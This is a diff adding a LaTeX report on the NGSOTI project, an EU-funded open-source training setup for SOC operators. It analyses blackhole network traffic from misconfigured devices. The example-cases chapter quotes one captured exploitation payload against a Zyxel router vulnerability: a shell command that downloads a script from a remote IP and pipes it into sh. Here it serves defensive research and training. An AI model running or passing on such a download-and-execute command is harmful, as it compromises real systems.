@@ -1,0 +1,67 @@
+% Abstract
+\chapter*{Abstract}
+The Next Generation Security Operator Training Infrastructure (NGSOTI) aims to provide an open-source environment for Security Operations Center (SOC) operators to train in handling network-related alerts. This document outlines the objectives, methodologies, and findings of the NGSOTI project, including a detailed analysis of misconfigured systems and blackhole traffic data.
+
+% Table of Contents
+\tableofcontents
+
+% Chapter 1: Introduction
+\chapter{Introduction}
+The NGSOTI project is a collaborative effort aimed at enhancing the training infrastructure for SOC operators. Coordinated by CIRCL, the initiative involves partnerships with Restena, Tenzir, and the University of Luxembourg. The project began on January 1, 2024, and is scheduled to conclude on December 31, 2026, with a total budget of €1,477,349.00. CIRCL leads the effort as the project coordinator, with additional funding provided by the European Union.
+
+NGSOTI's primary goal is to equip SOC operators with practical tools and methodologies to handle real-world incidents. By leveraging open-source technologies, the project seeks to create a training platform that emphasizes practical skills, ensuring operators are well-prepared for emerging cybersecurity challenges.
+
+% Chapter 2: Objectives
+\chapter{Objectives}
+The NGSOTI project aims to establish an open-source infrastructure tailored for SOC operator training. The infrastructure is designed to address key aspects of cybersecurity operations, including incident response, log management, and SOC management processes. Additionally, the project emphasizes communication, documentation, and the integration of cyber threat intelligence (CTI) using tools like MISP.
+
+By employing technologies such as Suricata, Zeek, and Tenzir, the project seeks to enhance intrusion detection and analysis capabilities. Tools like FlowIntel for case management and OpenNMS for monitoring are also integral to the training platform. Furthermore, the action incorporates MeliCERTes' Cerebrate tool, ensuring a comprehensive approach to SOC training.
+
+% Chapter 3: Blackhole Traffic Analysis
+\chapter{Blackhole Traffic Analysis}
+The project uses a methodical approach to analyze misconfigured systems by routing unused network ranges to a specific IP address for full packet capture. This setup allows for the collection of data on network activities that may indicate misconfigurations or malicious behavior. The captured data is streamed unidirectionally to a D4 collector, enabling a detailed analysis of the traffic.
+
+The dataset analyzed during the project spans from January 1, 2024, to October 17, 2024, and includes over 10,226 unique destination IP addresses. In total, 4.31 TB of data was collected. This data provides invaluable insights into the nature of misconfigured devices and the patterns of malicious activities observed within the blackhole networks.
+
+% Chapter 4: Observations
+\chapter{Observations}
+Misconfigured devices are a recurring theme in the analysis. These misconfigurations often result from typographical errors or improper default routing setups. For instance, devices that send SYSLOG messages to unintended networks represent a common type of misconfiguration. Similarly, MikroTik routers are often observed connecting to external services, such as \texttt{cloud.mikrotik.com}, due to default configurations.
+
+DNS misconfigurations are another significant finding. When a secondary DNS resolver is misconfigured, it frequently goes unnoticed, leading to unintended traffic redirection. These observations highlight the importance of proper configuration and monitoring practices to avoid exposing sensitive systems to potential threats.
+
+% Chapter 5: Example Cases
+\chapter{Example Cases}
+\section{Mass Exploitation of Devices}
+Mass exploitation campaigns are a critical concern in cybersecurity. Attackers often exploit known vulnerabilities as soon as they are disclosed. A notable example observed during the project was the exploitation of the Zyxel router vulnerability (CVE-2023-28771), which allowed attackers to bypass authentication. The exploitation involved malicious payloads, such as the following command executed on vulnerable systems:
+\begin{verbatim}
+bash -c "curl http://92.60.77.85/z -o-|sh";
+\end{verbatim}
+This case underscores the need for timely patching and proactive defense mechanisms to mitigate the risks associated with known vulnerabilities.
+
+\section{SYSLOG Misconfigurations}
+Another observed issue was the improper configuration of SYSLOG services. Devices inappropriately sent SYSLOG messages to blackhole networks. For example, a SYSLOG message from a misconfigured firewall contained the following:
+\begin{verbatim}
+2024-10-01 12:49:18 IP x.x.196.218.45389 > x.x.x.x.514: SYSLOG local0.info
+\end{verbatim}
+This type of misconfiguration can result in the unintentional exposure of internal system information, creating vulnerabilities for exploitation.
+
+\section{Intercom Systems and XML Messages}
+Misconfigured intercom systems were also identified during the analysis. For example, an intercom system transmitted an XML-based message containing sensitive details, such as device serial numbers and IP addresses:
+\begin{verbatim}
+<videoIntercomMsg>
+<header>
+<method>1</method>
+<action>1</action>
+<from><deviceSN>Q05586499</deviceSN></from>
+</header>
+</videoIntercomMsg>
+\end{verbatim}
+Such exposures highlight the risks associated with improper device configuration and the potential for unauthorized access to sensitive systems.
+
+% Chapter 6: Conclusions
+\chapter{Conclusions}
+The NGSOTI project demonstrates the critical importance of proper configuration and monitoring in maintaining the security of networked systems. Misconfigured devices, often the result of typographical errors or default settings, represent a significant security risk. The rapid exploitation of known vulnerabilities further emphasizes the need for proactive measures, such as timely patching and effective monitoring.
+
+The project's open-source approach provides a valuable training platform for SOC operators, enabling them to work with real-world data and tools. By fostering practical skills and emphasizing real-time analysis, NGSOTI equips cybersecurity professionals to better respond to emerging threats.
+
+
